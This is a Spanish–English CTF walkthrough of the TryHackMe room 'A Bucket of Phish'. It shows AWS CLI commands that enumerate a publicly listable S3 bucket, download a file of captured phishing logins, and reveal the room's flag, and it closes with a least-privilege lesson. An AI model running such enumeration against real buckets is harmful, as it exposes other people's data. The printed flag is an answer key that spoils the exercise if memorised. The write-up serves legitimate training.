# A Bucket of Phish

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | challenge cloud (S3) | `abucketofphish` | https://tryhackme.com/room/abucketofphish | 01 Level Easy | TryHackMe | AWS CLI / Amazon S3 (bucket) / políticas y listados de bucket mal configurados | Reto de phishing en cloud: explotar un bucket S3 con permisos demasiado abiertos para recuperar credenciales capturadas y la flag. |

---

**Contexto:** Reto tipo CTF de la temporada de desafíos cloud de TryHackMe. Se entregan credenciales de AWS CLI para acceder al entorno y el objetivo es localizar un bucket S3 con permisos de listado/lectura excesivos. Dentro del bucket se sirve una infraestructura de phishing (página, archivos de logins capturados). Descargar esos datos y leerlos revela la flag. Es un ejemplo clásico de misconfiguration en S3: bucket legible sin autenticación, lo que permite exfiltrar datos con solo tres comandos.

> **ES:** Un bucket S3 de phishing con permisos inseguros. Configura las credenciales AWS, enumera el bucket, descarga los datos capturados y encuentra la flag.
> **EN:** A misconfigured phishing S3 bucket. Set up the AWS credentials, enumerate the bucket, download the captured data and retrieve the flag.

## Solucionario

### Task 1: El bucket de phishing / The Phishing Bucket

**Explicación:** Con las credenciales de AWS CLI del reto, se listan los buckets accesibles. El bucket de phishing responde a `aws s3 ls` porque su política permite el listado público. Dentro aparecen un `index.html` (la página de phishing) y un archivo de resultado con los logins capturados. Tras descargarlo con `aws s3 cp`, al leer su contenido aparece la flag.

```bash
aws configure                          # credenciales proporcionadas en la room
aws s3 ls                              # identificar buckets accesibles
aws s3 ls s3://darkinjector-phish      # listar el contenido del bucket
aws s3 cp s3://darkinjector-phish/captured-logins-093582390 ./
cat captured-logins-093582390          # -> flag
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? / ¿Cuál es la flag? | `THM{this_is_not_what_i_meant_by_public}` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag? / ¿Cuál es la flag? | `THM{this_is_not_what_i_meant_by_public}` |

---

**Metodología:** Configurar las credenciales AWS proporcionadas, enumerar buckets con `aws s3 ls`, abusar de la política de listado público, descargar el archivo con los logins capturados y leer la flag.

### Cadena de ataque / Attack Chain

```text
aws configure -> aws s3 ls -> listar bucket (política abierta) -> aws s3 cp del archivo de logins -> cat -> flag
```

**Learning chain:** Cloud -> AWS S3 -> misconfiguration (ACL/política) -> enumeración -> exfiltración de datos capturados.

**Lección:** *Un bucket S3 con permisos de listado/lectura públicos expone todo lo que contiene; aplicar el principio de menor privilegio y auditar las políticas de acceso.*

**MITRE ATT&CK:** T1083 (File and Directory Discovery), T1213 (Data from Information Repositories), T1105 (Ingress Tool Transfer), T1530 (Data from Cloud Storage)

**Fuente:** [TryHackMe - A Bucket of Phish](https://tryhackme.com/room/abucketofphish)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.